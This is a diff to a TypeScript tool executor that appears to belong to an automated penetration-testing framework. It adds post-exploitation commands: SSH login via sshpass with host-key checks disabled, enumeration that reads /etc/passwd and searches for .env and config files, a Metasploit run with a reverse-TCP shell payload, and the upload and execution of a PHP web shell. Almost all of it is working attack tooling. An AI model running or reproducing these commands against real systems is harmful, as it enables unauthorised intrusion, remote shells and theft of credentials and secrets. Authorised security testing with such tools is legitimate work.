@@ -66,11 +66,21 @@ interface ToolOptions {
   mode?: string;
   service?: string;
   username?: string;
+  password?: string;
   wordlist?: string;
   port?: number;
   scanType?: string;
   timeout?: number;
   args?: string[];
+  command?: string;
+  module?: string;
+  payload?: string;
+  lhost?: string;
+  lport?: string;
+  extra?: string;
+  uploadUrl?: string;
+  shellContent?: string;
+  filename?: string;
 }
 
 // Common wordlist paths (container may have different paths than host)
@@ -216,6 +226,53 @@ const TOOL_COMMANDS: Record<string, (target: string, opts: ToolOptions) => strin
     // Execute inside the MSF container via docker exec
     return ['docker', 'exec', 'cstrike-msf', 'msfconsole', '-q', '-n', '-x', fullCommand];
   },
+
+  // ── Post-exploitation tools ──────────────────────────────────────────────
+
+  ssh_connect: (target, opts) => {
+    const host = extractHost(target);
+    const port = opts.port ?? 22;
+    const user = opts.username ?? 'root';
+    const password = opts.password ?? '';
+    const cmd = opts.command ?? 'id; whoami; hostname; uname -a; sudo -l 2>&1; cat /etc/passwd | grep -v nologin; find / -perm -4000 -type f 2>/dev/null; ls -la /etc/cron.d/ 2>/dev/null; cat /etc/crontab 2>/dev/null';
+    return ['sshpass', '-p', password, 'ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'UserKnownHostsFile=/dev/null', '-o', 'ConnectTimeout=10', '-p', String(port), `${user}@${host}`, cmd];
+  },
+
+  msf_exploit: (target, opts) => {
+    const host = extractHost(target);
+    const module = opts.module ?? 'exploit/multi/handler';
+    const payload = opts.payload ?? 'linux/aarch64/shell_reverse_tcp';
+    const lhost = opts.lhost ?? '10.10.10.1';
+    const lport = opts.lport ?? '4444';
+    const extra = opts.extra ?? '';
+    const msfCmd = `use ${module}; set RHOSTS ${host}; set RHOST ${host}; set PAYLOAD ${payload}; set LHOST ${lhost}; set LPORT ${lport}; ${extra}; run; sleep 10; exit`;
+    return ['docker', 'exec', 'cstrike-msf', 'msfconsole', '-q', '-x', msfCmd];
+  },
+
+  privesc_check: (target, opts) => {
+    const host = extractHost(target);
+    const port = opts.port ?? 22;
+    const user = opts.username ?? 'admin';
+    const password = opts.password ?? '';
+    const enumCmd = [
+      'echo "=== SUID ===" && find / -perm -4000 -type f 2>/dev/null',
+      'echo "=== SUDO ===" && sudo -l 2>&1',
+      'echo "=== CRON ===" && cat /etc/crontab 2>/dev/null && ls -la /etc/cron.d/ 2>/dev/null',
+      'echo "=== WRITABLE ===" && find / -writable -type d 2>/dev/null | head -20',
+      'echo "=== KERNEL ===" && uname -r && cat /proc/version 2>/dev/null',
+      'echo "=== PASSWD ===" && cat /etc/passwd | grep -v nologin | grep -v false',
+      'echo "=== HOME ===" && ls -laR /home/ 2>/dev/null | head -50',
+      'echo "=== ENV ===" && find / -name ".env" -o -name "*.conf" -o -name "config.php*" 2>/dev/null | head -20',
+    ].join(' && ');
+    return ['sshpass', '-p', password, 'ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'UserKnownHostsFile=/dev/null', '-o', 'ConnectTimeout=10', '-p', String(port), `${user}@${host}`, enumCmd];
+  },
+
+  webshell_upload: (target, opts) => {
+    const uploadUrl = opts.uploadUrl ?? `${target}/upload.php`;
+    const shellContent = opts.shellContent ?? '<?php system($_GET["cmd"]); ?>';
+    const filename = opts.filename ?? 'shell.php';
+    return ['sh', '-c', `echo '${shellContent}' > /tmp/${filename} && curl -s -F "file=@/tmp/${filename}" "${uploadUrl}" && echo "UPLOAD_COMPLETE" && curl -s "${target}/uploads/${filename}?cmd=id" && rm -f /tmp/${filename}`];
+  },
 };
 
 class ToolExecutor {
@@ -251,8 +308,12 @@ class ToolExecutor {
   // Tool-specific timeout overrides (ms)
   private static readonly TOOL_TIMEOUTS: Record<string, number> = {
     metasploit: 600_000,   // 10 min — MSF loads slowly + multiple modules
+    msf_exploit: 600_000,  // 10 min — MSF exploit execution
     zap: 600_000,          // 10 min — spider + active scan
     searchsploit: 60_000,  // 1 min
+    ssh_connect: 60_000,   // 1 min — single SSH command
+    privesc_check: 120_000, // 2 min — enumeration over SSH
+    webshell_upload: 60_000, // 1 min
   };
 
   /**
